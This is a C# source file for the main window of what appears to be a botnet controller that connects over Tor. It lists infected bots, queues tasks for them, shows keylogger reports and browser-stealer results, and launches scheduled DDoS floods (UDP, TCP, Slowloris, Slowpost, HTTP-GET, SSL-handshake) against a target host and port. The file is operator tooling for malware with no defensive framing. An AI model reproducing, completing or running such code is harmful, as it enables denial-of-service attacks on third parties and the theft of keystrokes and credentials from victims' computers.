using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using System.IO;

using Controller.Core;
using Controller.Core.Config;
using Controller.Core.Settings;
using Controller.Forms;
using DevExpress.XtraGrid.Views.Grid.ViewInfo;
using DevExpress.XtraGrid.Views.Base;
using System.Data;

namespace Controller
{
    public partial class frmMain : DevExpress.XtraEditors.XtraForm
    {
        private CController m_Controller = null;
        
        public frmMain()
        {
            InitializeComponent();
        }

        private void frmMain_Load(object sender, EventArgs e)
        {
            
            try
            {
                if (CSettings.LoadSettings())
                {
                    object objOnionAddress = CSettings.GetValue("OnionAddress");
                    if (objOnionAddress != null)
                    {
                        Program.ControllerConfig.OnionAddress = (String)objOnionAddress;
                    }

                    object objOnionPort = CSettings.GetValue("OnionPort");

                    if (objOnionPort != null && Int32.TryParse((String)objOnionPort, out Program.ControllerConfig.OnionPort))
                    {
                        
                    }

                    object objTorIP = CSettings.GetValue("TorIP");

                    if(objTorIP != null)
                    {
                        Program.ControllerConfig.Tor_Host = (String)objTorIP;
                    }

                    object objTorPort = CSettings.GetValue("TorPort");

                    if (objTorPort != null && Int32.TryParse((String)objTorPort, out Program.ControllerConfig.Tor_Port))
                    {

                    }

                    object objAdminUsername = CSettings.GetValue("AdminUsername");

                    if (objAdminUsername != null)
                    {
                        Program.ControllerConfig.AdminUsername = (string)objAdminUsername;
                    }

                    object objAdminPassword = CSettings.GetValue("AdminPassword");

                    if (objAdminPassword != null)
                    {
                        Program.ControllerConfig.AdminPassword = (string)objAdminPassword;
                    }
                }

                m_Controller = new CController(this);
            }
            catch(Exception ex)
            {
                MessageBox.Show("There has been a fatal error. The controller wont work. Please contact support.");
            }
        }

        private void frmMain_FormClosing(object sender, FormClosingEventArgs e)
        {
            m_Controller.Stop();
        }

        private void btnSaveControllerSettings_Click(object sender, EventArgs e)
        {
  
        }

        private void tabPage3_Click(object sender, EventArgs e)
        {

        }

        private void cmsTasklist_Opening(object sender, CancelEventArgs e)
        {
            
            //miRemoveTask.Visible = dgvTasks.SelectedRows.Count > 0;
            //toolStripMenuItem5.Visible = dgvTasks.SelectedRows.Count > 0;
        }

        private void miRemoveTask_Click(object sender, EventArgs e)
        {
            /*foreach (ListViewItem item in lvMainTasks.SelectedItems)
            {
                int iTaskID = -1;
                if (int.TryParse(item.Text, out iTaskID))
                	m_Controller.RemoveTask(iTaskID);
            }*/

            /*foreach(DataGridViewRow row in dgvTasks.SelectedRows)
            {
                int iTaskID = -1;

                if (int.TryParse(row.Cells[0].Value.ToString(), out iTaskID))
                    m_Controller.RemoveTask(iTaskID);
            }
            */
        }

        private void btnAddTask_Click(object sender, EventArgs e)
        {
            if (String.IsNullOrEmpty(cbTask.Text))
            {
                MessageBox.Show("You forgot to choose a task.");
                return;
            }

            if (String.IsNullOrEmpty(txtTaskExecutes.Text))
            {
                MessageBox.Show("You forgot to enter the amount of Executes. Use 0 for unlimited.");
                return;
            }

            try
            {
                int iExecutes = -1;
                if (int.TryParse(txtTaskExecutes.Text, out iExecutes))
                {
                    m_Controller.AddTask(cbTask.Text, txtTaskParameters.Text, iExecutes);
                }
                else MessageBox.Show("Executes must be a integer value. Use 0 for unlimited.");
                
                txtTaskParameters.Text = string.Empty;
                txtTaskExecutes.Text = string.Empty;
            }
            catch
            {
            	
            }
        }

        private void btnStartAttack_Click(object sender, EventArgs e)
        { 	
            try
            {
                int iAttackType, iAttackPort;

                switch(cbAttackType.Text)
                {
                    case "UDP":
                        iAttackType = 0;
                        break;
                    case "TCP":
                        iAttackType = 1;
                        break;
                    case "Slowpost":
                        iAttackType = 2;
                        break;
                    case "Slowloris":
                        iAttackType = 3;
                        break;
                    case "HTTP-GET":
                        iAttackType = 4;
                        break;
                    case "SSL-Handshake":
                        iAttackType = 5;
                        break;
                    default: iAttackType = -1; break;
                }

                if(iAttackType == -1)
                {
                	throw new Exception("You were trying to launch an Attack with an invalid Attack Type.");
                }

                if(int.TryParse(txtAttackPort.Text, out iAttackPort))
                {
                	string strAttackArguments = string.Format("{0}|{1}|{2}", txtAttackHost.Text, iAttackPort, iAttackType);

                    int iInterval, iSockets;

                    if (!int.TryParse(txtDdosSockets.Text, out iSockets))
                        throw new Exception("Invalid Socket amount was provided.");
                    if (!int.TryParse(txtDdosInterval.Text, out iInterval))
                        throw new Exception("Invalid Interval amount was provided.");

                    if (iInterval >= 999)
                    {
                        if (MessageBox.Show("Using Interval larger than 999ms will cause the PPS and Rate to not work. This will be fixed later. Are you sure you want to use this interval?", "Warning", MessageBoxButtons.YesNo) != DialogResult.Yes)
                            return;
                    }

                    strAttackArguments += string.Format("|{0}|{1}", iSockets, iInterval);
                	
                	if(cbEnableDdosTimeConfiguration.Checked)
                	{
                		TimeSpan tpDifference = dtpDdosDate.Value - DateTime.Now;
                		
                		strAttackArguments += string.Format("|{0}", tpDifference.TotalHours);
                	}

                	m_Controller.AddDdos(strAttackArguments);
                    //m_Controller.AddTask("StartAttack", String.Format("{0}|{1}|{2}|{3}", iAttackType, txtAttackHost.Text, iAttackPort, 0), 0);
                } 
                else throw new Exception("Port and Time must be Integer values.");
                
                txtAttackHost.Text = string.Empty;
                txtAttackPort.Text = string.Empty;
                cbEnableDdosTimeConfiguration.Checked = false;
            }
            catch(Exception ex)
            {
            	MessageBox.Show(ex.Message);
            }
        }

        private void refreshToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                m_Controller.GetDdoslist();
            }
            catch { }
        }

        private void cmsDdosStop_Opening(object sender, CancelEventArgs e)
        {
            
        }

        private void removeTaskToolStripMenuItem_Click(object sender, EventArgs e)
        {

        }

        private void miNextStealerPage_Click(object sender, EventArgs e)
        {

            
        }

        private void miPreviousStealerPage_Click(object sender, EventArgs e)
        {

        }

        private void refreshToolStripMenuItem_Click_1(object sender, EventArgs e)
        {
            if (Program.ControllerConfig.CurrentStealerPage == 0) return;

            m_Controller.GetStealerlist(Program.ControllerConfig.CurrentStealerPage);
        }

        private void txtTorLog_TextChanged(object sender, EventArgs e)
        {

        }
        
		void BtnSearchKeylogsClick(object sender, System.EventArgs e)
		{
			
		}
		
		void CbEnableDdosTimeConfigurationCheckedChanged(object sender, EventArgs e)
		{
			dtpDdosDate.Enabled = cbEnableDdosTimeConfiguration.Checked;
		}
		void BtnSaveLogsClick(object sender, EventArgs e)
		{
            try
            {
                var lstLog = new List<string>();

                foreach (string s in lbLogs.Items)
                    lstLog.Add(s);

                File.WriteAllLines("log.txt", lstLog.ToArray());
                MessageBox.Show("Logs saved to: log.txt");
            }
            catch { }
		}

        private void btnSearchBrowserStealer_Click(object sender, EventArgs e)
        {
            m_Controller.SetBrowserStealerTag(txtStealerSearchTags.Text);
        }

        private void btnSearchKeylogs_Click(object sender, EventArgs e)
        {
            m_Controller.SetKeylogTag(txtKeylogSearchTags.Text);
        }

        private void miStartController_ItemClick(object sender, DevExpress.XtraBars.ItemClickEventArgs e)
        {
            m_Controller.Start();

            miStartController.Enabled = false;
        }

        private void gcTasklist_Click(object sender, EventArgs e)
        {
            
        }

        private void btnNextBotlistPage_Click(object sender, EventArgs e)
        {
            if (Program.ControllerConfig.CurrentBotPage + 1 > Program.ControllerConfig.TotalBotPages) return;

            m_Controller.GetBots(Program.ControllerConfig.CurrentBotPage + 1);
        }

        private void xtraTabPage1_Paint(object sender, PaintEventArgs e)
        {

        }

        private void btnPreviousBotlistPage_Click(object sender, EventArgs e)
        {
            if (Program.ControllerConfig.CurrentBotPage - 1 < 1) return;

            m_Controller.GetBots(Program.ControllerConfig.CurrentBotPage - 1);
        }

        private void btnRefreshBotlistPage_Click(object sender, EventArgs e)
        {
            if (Program.ControllerConfig.CurrentBotPage == 0) return;

            m_Controller.GetBots(Program.ControllerConfig.CurrentBotPage);
        }

        private void gcTasklist_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            GridHitInfo ghi = gvTasklist.CalcHitInfo(e.Location);

            if (ghi.Column == null)
                return;

            if (string.IsNullOrEmpty(ghi.Column.FieldName)) return;

            DataRowView Row = (DataRowView)gvTasklist.GetRow(ghi.RowHandle);

            if (ghi.Column.FieldName != "Delete") return;

            int iTaskID = -1;

            if (!int.TryParse(Row[0].ToString(), out iTaskID)) return;

            if(MessageBox.Show(string.Format("Are you sure you want to delete Task with\nID: {0}\nTask: {1}\nParameters: {2}\nExecutes: {3}\nExecuted: {4}\nSuccessful: {5}\n", iTaskID, Row[1].ToString(), Row[2].ToString(), Row[3].ToString(), Row[4].ToString(), Row[5].ToString()), "Are you sure?", MessageBoxButtons.YesNo) == DialogResult.Yes)
            {
                m_Controller.RemoveTask(iTaskID);
            }
        }

        private void xtraTabPage2_Paint(object sender, PaintEventArgs e)
        {

        }

        private void btnNextKeyloggerPage_Click(object sender, EventArgs e)
        {
            if (Program.ControllerConfig.CurrentKeylogPage + 1 > Program.ControllerConfig.TotalKeylogPages)
                return;

            m_Controller.GetKeyloggerList(Program.ControllerConfig.CurrentKeylogPage + 1);
        }

        private void btnPreviousKeyloggerPage_Click(object sender, EventArgs e)
        {
            if (Program.ControllerConfig.CurrentKeylogPage - 1 < 1) return;

            m_Controller.GetKeyloggerList(Program.ControllerConfig.CurrentKeylogPage - 1);
        }

        private void btnNextStealerPage_Click(object sender, EventArgs e)
        {
            if (Program.ControllerConfig.CurrentStealerPage + 1 > Program.ControllerConfig.TotalStealerPages)
                return;

            m_Controller.GetStealerlist(Program.ControllerConfig.CurrentStealerPage + 1);
        }

        private void btnPreviousPage_Click(object sender, EventArgs e)
        {
            if (Program.ControllerConfig.CurrentStealerPage - 1 < 1) return;

            m_Controller.GetStealerlist(Program.ControllerConfig.CurrentStealerPage - 1);
        }

        private void miSettings_ItemClick(object sender, DevExpress.XtraBars.ItemClickEventArgs e)
        {
            using (frmSettings formSettings = new frmSettings())
            {
                formSettings.ShowDialog();
            }
        }

        private void gcStealerList_MouseDoubleClick(object sender, MouseEventArgs e)
        {

        }

        private void gcKeyloggerList_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            GridHitInfo ghi = gvKeyloggerList.CalcHitInfo(e.Location);

            if (ghi.Column == null)
                return;

            if (string.IsNullOrEmpty(ghi.Column.FieldName)) return;

            DataRowView Row = (DataRowView)gvKeyloggerList.GetRow(ghi.RowHandle);

            if (ghi.Column.FieldName != "View") return;

            int iReportID = -1;

            if (!int.TryParse(Row[0].ToString(), out iReportID)) return;

            m_Controller.GetKeyloggerReport(iReportID);
        }

        private void gcDdosList_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            GridHitInfo ghi = gvDdosList.CalcHitInfo(e.Location);

            if (ghi.Column == null)
                return;

            if (string.IsNullOrEmpty(ghi.Column.FieldName)) return;

            DataRowView Row = (DataRowView)gvDdosList.GetRow(ghi.RowHandle);

            if (ghi.Column.FieldName != "Stop") return;

            int iDdosID = -1;

            if (!int.TryParse(Row[0].ToString(), out iDdosID)) return;

            m_Controller.AddDdos(iDdosID.ToString());
        }
    }
}
